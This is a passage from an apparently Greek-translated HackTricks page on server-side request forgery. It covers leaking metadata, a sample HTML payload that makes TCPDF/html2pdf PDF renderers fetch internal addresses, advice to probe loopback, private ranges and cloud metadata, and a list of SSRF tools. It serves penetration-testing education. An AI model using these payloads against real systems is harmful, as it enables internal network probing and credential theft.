- Σε αυτή τη λειτουργία εξάγει ολόκληρη την αλυσίδα ανακατευθύνσεων μαζί με το τελικό σώμα πίσω στον εξωτερικό καλούντα.
- Αποτέλεσμα: ο attacker βλέπει κάθε header + το metadata JSON, αποστολή ολοκληρώθηκε.

Σημειώστε ότι αυτό είναι ενδιαφέρον για να leak κωδικούς κατάστασης που δεν μπορούσατε να leak πριν (όπως ένα 200). Ωστόσο, αν με κάποιο τρόπο μπορούσατε επίσης να επιλέξετε τον κωδικό κατάστασης της απάντησης (φανταστείτε ότι μπορείτε να αποφασίσετε ότι το AWS metadata απαντά με κωδικό 500), **μπορεί να υπάρχουν κάποιοι κωδικοί κατάστασης που απευθείας leak το περιεχόμενο της απάντησης.**

### HTML-to-PDF renderers as blind SSRF gadgets

Βιβλιοθήκες όπως **TCPDF** (και wrappers όπως **spipu/html2pdf**) θα κάνουν αυτόματα fetch οποιεσδήποτε URLs υπάρχουν στο attacker-controlled HTML κατά τη δημιουργία ενός PDF. Κάθε `<img>` ή `<link rel="stylesheet">` attribute επιλύεται server-side μέσω cURL, `getimagesize()`, ή `file_get_contents()`, οπότε μπορείτε να οδηγήσετε τον PDF worker να probe εσωτερικούς hosts παρόλο που καμία HTTP response δεν αντανακλάται σε εσάς.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 issues several retrieval attempts for each `<img>` resource, so a single payload can generate multiple requests (helpful for timing-based port scans).
- html2pdf copies TCPDF’s behaviour for `<img>` and adds CSS fetching inside `Css::extractStyle()`, which simply calls `file_get_contents($href)` after a shallow scheme check. Abuse it to hit loopback services, RFC1918 ranges, or cloud metadata endpoints.
- Combine this SSRF primitive with the [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) to leak both internal HTTP responses and local files rendered into the PDF.

Οι Hardeners πρέπει να αφαιρούν εξωτερικά URLs πριν το rendering ή να απομονώσουν τον renderer σε network sandbox· μέχρι τότε, θεωρήστε τους PDF generators ως blind SSRF proxies.

## Εκμετάλλευση SSRF στο Cloud

Αν βρείτε μια ευπάθεια SSRF σε μια μηχανή που τρέχει σε περιβάλλον cloud, μπορεί να καταφέρετε να αποκτήσετε ενδιαφέρουσες πληροφορίες για το cloud περιβάλλον και ακόμη διαπιστευτήρια:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## Πλατφόρμες ευάλωτες σε SSRF

Πολλές γνωστές πλατφόρμες περιέχουν ή περιείχαν ευπάθειες SSRF — δείτε τις εδώ:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Εργαλεία

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Εργαλείο για τον εντοπισμό και την εκμετάλλευση ευπαθειών SSRF

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Αυτό το εργαλείο δημιουργεί Gopher payloads για:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ είναι ένας scanner ευπαθειών _Java RMI_ που υποστηρίζει επιθετικές ενέργειες για τις πιο κοινές ευπάθειες _Java RMI_. Οι περισσότερες από τις διαθέσιμες λειτουργίες υποστηρίζουν την επιλογή `--ssrf`, για να δημιουργήσουν ένα _SSRF_ payload για την ζητούμενη ενέργεια. Μαζί με την επιλογή `--gopher`, μπορούν να παραχθούν άμεσα έτοιμα _gopher_ payloads.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

Το SSRF Proxy είναι ένας πολυνηματικός HTTP proxy server σχεδιασμένος να τρέχει την κίνηση HTTP πελατών μέσω HTTP servers ευάλωτων σε Server-Side Request Forgery (SSRF).

### Για εξάσκηση


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Αναφορές

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
